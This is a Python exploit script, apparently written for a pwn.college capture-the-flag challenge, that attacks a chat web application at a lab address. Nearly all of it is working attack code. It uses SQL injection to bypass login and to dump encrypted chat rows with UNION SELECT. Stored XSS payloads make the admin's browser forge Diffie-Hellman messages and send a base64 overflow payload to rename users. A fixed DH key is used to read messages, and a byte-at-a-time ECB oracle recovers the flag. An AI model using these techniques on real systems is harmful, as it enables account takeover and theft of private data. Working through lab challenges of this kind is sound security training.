#!/usr/bin/env python3
"""
exploit_sc3.py

1) Re-uses your DH=1 MITM technique to discover Sharon's username.
2) Plants an admin-XSS payload into Alice's chat (as Mallory) that will:
   - rename bob -> <sharon_username>
   - rename sharon -> <prefix><sharon_username>
   The XSS runs in Alice's automated browser (Alice is admin), so those are admin actions.
3) Logs everything verbosely so you can debug step-by-step.
4) Prints a brute-force template and the exact payloads used.
"""
import requests, time, re, sys
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import re, time, urllib.parse
from bs4 import BeautifulSoup
import math
import binascii
import os

# Known charset for the flag
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!?."

HEX_RE = re.compile(r'\b[0-9a-fA-F]{64,}\b')

BASE = "http://10.0.0.1"
BLOCK = 16

def wait_a_little():
    time.sleep(6)

def sqli_session(user_prefix):
    r = requests.post(f"{BASE}/login",
                      data={"username": f"' OR username LIKE '{user_prefix}%'--",
                            "password": "x"},
                      allow_redirects=False)
    return r.cookies.get("session")

def post(sess, to_user, msg):
    return requests.post(f"{BASE}/chat/{to_user}",
                         cookies={"session": sess},
                         data={"message": msg}, timeout=5)

def register(username: str, password: str = "x"):
    """Create a new user via /register; returns its session cookie (or None)."""
    r = requests.post(f"{BASE}/register",
                      data={"username": username, "password": password},
                      allow_redirects=False)
    return r.cookies.get("session")
    
def get(sess, with_user):
    return requests.get(f"{BASE}/chat/{with_user}",
                        cookies={"session": sess}, timeout=5).text

def try_decrypt_hexlines(html, key_bytes):
    out = []
    for enc in re.findall(r'\b[0-9a-f]{32,}\b', html):
        if len(enc) % 32 != 0:
            continue
        try:
            pt = unpad(AES.new(key_bytes, AES.MODE_ECB)
                       .decrypt(bytes.fromhex(enc)), 16).decode()
            out.append(pt)
        except ValueError:
            continue
    return out

def find_sharon_username(mallory_session, bob_session, timeout=300):
    """
    Poll bob->alice conversation (decrypting with DH=1 key) until we find the line:
      "Oh, it was 'sharon...'."
    Return the sharon plaintext username or None.
    """
    key = (1).to_bytes(256, "big")[:16]
    seen = set()
    print("[*] Searching for Sharon's username (this may take up to {}s)".format(timeout))
    for _ in range(timeout):
        # keep spamming bob -> alice '1.' so DH stays fake
        post(bob_session, "alice", "Hey Alice, sure: 1.")
        page = get(bob_session, "alice")
        pts = try_decrypt_hexlines(page, key)
        for m in pts:
            if m not in seen:
                seen.add(m)
                print("[decoded] ", m)
                if "it was '" in m:
                    match = re.search(r"it was '([^']+)'", m)
                    if match:
                        sh = match.group(1)
                        print("[+] Found Sharon username:", sh)
                        return sh
        time.sleep(1)
    return None

def manipulating_key_exchange(mallory, bob):
    # Step 1: Plant looping-XSS to spam Alice's DH_A=1.
    xss = (
        '<script>(async()=>{try{'
        "await fetch('/chat/bob',{method:'POST',credentials:'include',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'message='+encodeURIComponent(\"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: 1.\")});"
        "}catch(e){}})();</script>"
    )
    post(mallory, "alice", xss)

    # Step 3: Wait for Alice's forged dh_A
    print("[+] Waiting for Alice's forged dh_A...")
    for _ in range(30):
        if "DHE-AES: 1." in get(bob, "alice"):
            print("[+] Saw dh_A=1. from Alice!")
            break
        time.sleep(1)
    else:
        print("[-] Never saw forged dh_A"); return

    # Step 2: Trigger Alice's automation
    post(mallory, "alice", "I heard someone shared the flag with Bob!")

def rename(old_username, new_username):
    div_id = os.urandom(16).hex()
    #admin_pin_payload = 88 * b'A' + b'V\x12@\x00\x00\x00\x00\x00'
    admin_pin_payload_b64 = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVYSQAAAAAAA"
    #//const decodedData = window.atob("' + admin_pin_payload_b64 + '");\
    #return urllib.parse.quote_plus('<script>\
    xss_payload = '<div id="' + div_id + '"></div>\
<script>\
dec_data = window.atob("' + admin_pin_payload_b64 + '");\
var num_divs = document.getElementsByTagName("div").length;\
fetch("http://127.0.0.1/user/' + old_username + '/modify", \
{headers:{"Content-Type": "application/x-www-form-urlencoded"}, \
method: "POST", credentials: "include", \
body: "username=' + new_username + '&password=A&admin_pin=" + dec_data})\
.then(response => response.text())\
.then(response => console.log(response))\
</script>'
    
    post(mallory_session, "alice", xss_payload)
    

def get_enc_sharon_msg_via_modify():
    session = requests.Session()
    # First login with SQL injection to authenticate
    login_response = session.post(f"{BASE}/login", 
                                data={"username": "mallory' -- ", "password": 'A'})
    
    # Check if login was successful
    if "Hello" not in login_response.text:
        print("[ERROR] Login failed in get_enc_sharon_msg_via_modify")
        return None
    
    # Now make the modify request
    sharon_payload = "' UNION SELECT encrypted_contents, 'dummy', 0 FROM encrypted_chats WHERE encrypted_username_1 IS NULL OR encrypted_username_2 IS NULL ORDER BY encrypted_contents ASC -- -"
    encoded_payload = urllib.parse.quote(sharon_payload)
    response = session.get(f"{BASE}/user/{encoded_payload}/modify")
    
    # Parse the HTML response - extract from the page text since we're not admin
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Method 1: Look for the username input field (if admin)
    username_input = soup.find('input', {'name': 'username'})
    if username_input:
        return username_input.get('value')
    
    # Method 2: Extract from the page text (for non-admin users)
    # The encrypted message appears in the text: "Modify user ENCRYPTED_MESSAGE:"
    page_text = soup.get_text()
    if "Modify user " in page_text and ":" in page_text:
        # Extract the part between "Modify user " and ":"
        start_index = page_text.find("Modify user ") + len("Modify user ")
        end_index = page_text.find(":", start_index)
        if end_index > start_index:
            enc_msg = page_text[start_index:end_index].strip()
            return enc_msg
    
    print("[ERROR] Failed to extract encrypted message from modify endpoint")
    print("Response status:", response.status_code)
    print("Response content:", response.text[:500])
    return None

def get_enc_sharon_msg_from_db(dummy_enc):
    sqli_query = f"mallory' \
UNION SELECT encrypted_contents AS lala,0,0 FROM encrypted_chats \
WHERE (encrypted_username_1 IS NULL OR encrypted_username_2 IS NULL) \
AND COALESCE(encrypted_chats.encrypted_username_2,'') NOT LIKE '{dummy_enc}%' "
#WHERE encrypted_username_1 IS NULL \
#AND encrypted_username_2 NOT LIKE '{dummy_enc}%' "
    order = "ORDER BY lala ASC -- "
    session = requests.Session()
    response = session.post(f"{BASE}/login", data={"username": sqli_query + order, "password": 'A'})
    print(response.text)

    if "mallory" in response.text.split("<br>")[0]:
        order = "ORDER BY lala DESC -- "
        response = session.post(f"{BASE}/login", data={"username": sqli_query + order, "password": 'A'})
        if "mallory" in response.text.split("<br>")[0]:
            print("[ERROR] Not able to get sharon encrypted message")

    return response.text.split("<br>")[0].split(" ")[1][:-1]


def encrypt(old_username, plaintext):
    rename(old_username, plaintext)
    # wait for seconds to make sure the changes applied
    wait_a_little()
    
    session = requests.Session()
    # First login with SQL injection to authenticate
    login_response = session.post(f"{BASE}/login", 
                                data={"username": "mallory' -- ", "password": 'A'})
    
    # Check if login was successful
    if "Hello" not in login_response.text:
        print("[ERROR] Login failed in get_enc_sharon_msg_via_modify")
        return None

    # Now make the modify request
    sql_inj = "' UNION SELECT encrypted_username_1, encrypted_username_2, encrypted_contents FROM encrypted_chats WHERE LENGTH(encrypted_contents) = 32 --"
    encoded_payload = urllib.parse.quote(sql_inj)
    response = session.get(f"{BASE}/user/{encoded_payload}/modify")
    #print("sqli response 1: ", response.text.splitlines())
    username1 = bytes.fromhex(response.text.splitlines()[0].split()[2][:-1])
    print("username 1: ", username1.hex())

    sql_inj = "' UNION SELECT encrypted_username_2, encrypted_username_1, encrypted_contents FROM encrypted_chats WHERE LENGTH(encrypted_contents) = 32 --"
    encoded_payload = urllib.parse.quote(sql_inj)
    response = session.get(f"{BASE}/user/{encoded_payload}/modify")
    #print("sqli response 2: ", response.text.splitlines())
    username2 = bytes.fromhex(response.text.splitlines()[0].split()[2][:-1])
    print("username 2: ", username2.hex())

    if len(username1) > len(username2):
        return username1
    else:
        return username2


def padding_oracle_attack(sharon_username):
    print(f"[+] Starting padding oracle attack for sharon: {sharon_username}")

    target_encrypted_hex = get_enc_sharon_msg_via_modify()
    if not target_encrypted_hex:
        print("[ERROR] Could not get target encrypted message")
        return None

    print(f"[+] Target encrypted message length: {len(target_encrypted_hex)} chars")

    known_prefix = sharon_username + ": The flag is pwn.college{AuUbDvaVLZyKDQxT"
    print(f"[+] Known prefix: {known_prefix}")
    print(f"[+] Known prefix length: {len(known_prefix)}")

    # initial padding calculation
    current_plaintext = known_prefix
    padding_needed = 15 - (len(current_plaintext) % 16)
    blk = math.floor(len(current_plaintext)/16)

    print(f"[+] Initial padding needed: {padding_needed}")

    # TRACKERS (separate variables!)
    sharon_current = sharon_username       # Sharon's current username on the server
    enc_account = "test_user"              # the account we created earlier and use for encrypt()
                                           # this account *will be renamed* by encrypt(); keep track
    last_padding = None                    # to only rename Sharon when padding changes

    for position in range(100):
        print(f"\n[+] Position {position}, recovered so far: '{current_plaintext}'")

        if current_plaintext.endswith('}'):
            print("[+] Found closing brace, attack complete!")
            break

        # compute which block the next unknown byte is in
        padded_length = len(current_plaintext) + padding_needed
        # Block index inside the fixed target contents (no artificial A's)
        #target_block_idx = (len(current_plaintext)) // 16

        # Block index inside your test username (with the artificial A's)
        #test_block_idx   = (padding_needed + len(current_plaintext)) // 16

        #print(f"[+] padded_length={padded_length}, target_block_idx={target_block_idx}, test_block_idx={test_block_idx}, padding_needed={padding_needed}")
        print(f"[+] padded_length={padded_length}, block={blk}, padding_needed={padding_needed}")

        
        # Rename Sharon only when padding changes (or first iteration)
        desired_sharon_name = "A" * padding_needed + sharon_username
        if last_padding is None or desired_sharon_name != sharon_current:
            print(f"[DEBUG] Renaming Sharon: '{sharon_current}' -> '{desired_sharon_name}'")
            rename(sharon_current, desired_sharon_name)
            wait_a_little()
            sharon_current = desired_sharon_name
        last_padding = padding_needed
        
        found_char = None
        
        target_encrypted_hex = get_enc_sharon_msg_via_modify()
        print(f"Target encrypted message: ", target_encrypted_hex)
        
        #for chr(idx) in CHARSET:
        for idx in range(33, 127):
            # illegal chars:  # % & / ?
            if idx == 35 or idx == 37 or idx == 38 or idx == 47 or idx == 63:
                continue
            test_plaintext = "A" * padding_needed + current_plaintext + chr(idx)
            print(f"[DEBUG] Trying chr(idx) {chr(idx)!r} -> test_plaintext (len {len(test_plaintext)})")

            # IMPORTANT: always call encrypt with the current name of the test-account
            test_encrypted_bytes = encrypt(enc_account, test_plaintext)
            if not test_encrypted_bytes:
                print(f"[WARN] encrypt() failed for candidate {chr(idx)!r}; skipping")
                continue

            # encrypt() renames enc_account -> test_plaintext on the server, so update tracker
            enc_account = test_plaintext

            test_encrypted_hex = test_encrypted_bytes.hex()
            
            # Compare the correct block (each byte -> two hex chars)
            t0, t1 = blk * 32, (blk + 1) * 32
            u0, u1 = blk   * 32, (blk   + 1) * 32

            target_block = target_encrypted_hex[t0:t1]
            test_block   = test_encrypted_hex[u0:u1]
            
            #target_block = target_encrypted_hex[block_start:block_end]
            #test_block = test_encrypted_hex[block_start:block_end]

            #print(f"[DEBUG] comparing target block {target_block_idx} to test block {test_block_idx}:")
            print(f"    target: {target_block}")
            print(f"    test:   {test_block}")

            if target_block == test_block:
                found_char = chr(idx)
                print(f"[+] MATCH: found character '{chr(idx)}' at position {position}")
                break  # break out of charset loop; do not change enc_account further here

        if found_char:
            current_plaintext += found_char

            # update padding for next iteration (classic byte-by-byte logic)
            if padding_needed == 0:
                padding_needed = 15
                blk += 1
            else:
                padding_needed -= 1
        else:
            print(f"[ERROR] No matching character found at position {position}; aborting")
            break

    print(f"\n[+] Final recovered plaintext: {current_plaintext}")
    flag_match = re.search(r'pwn\.college\{[^}]*\}', current_plaintext)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n[+] FLAG RECOVERED: {flag}")
        return flag
    else:
        print("[ERROR] Could not extract flag from recovered plaintext")
        return None


def main():
    print("[*] starting exploit (SC5) — verbose logs ON")

    global mallory_session
    mallory_session = sqli_session("mallory")
    bob_session = sqli_session("bob")
    if not mallory_session or not bob_session:
        print("[-] Failed to get sessions for Mallory or Bob.")
        return

    print("[+] Mallory session:", mallory_session)
    print("[+] Bob session:", bob_session)

    session = requests.Session()
    
    # -----------------------------------------------------------------------------    
    target_enc1 = get_enc_sharon_msg_via_modify()
	
    print("sharon encrypted msg leaked from modify endpoint: ", target_enc1)
    input("press enter to continue!")
    # register new user 
    print("register test_user response: ", register("test_user", "A"))
    # create chat entry between mallory and test_user, to get stored in encrypted_chats
    print("mallory messages test_user response: ", post(mallory_session, "test_user", "a"))
    
    wait_a_little()
    #-----------------------------------------------------------------------------

    # Step 1: find sharon
    manipulating_key_exchange(mallory_session, bob_session)

    sharon_username = find_sharon_username(mallory_session, bob_session, timeout=300)
    if not sharon_username:
        print("[-] Could not recover Sharon username — aborting.")
        return
    
    # step 2: modify bob's username to sharon's username
    rename("bob", sharon_username)
    wait_a_little()
    
    # start padding oracle attack
    padding_oracle_attack(sharon_username)
    
if __name__ == "__main__":
    main()
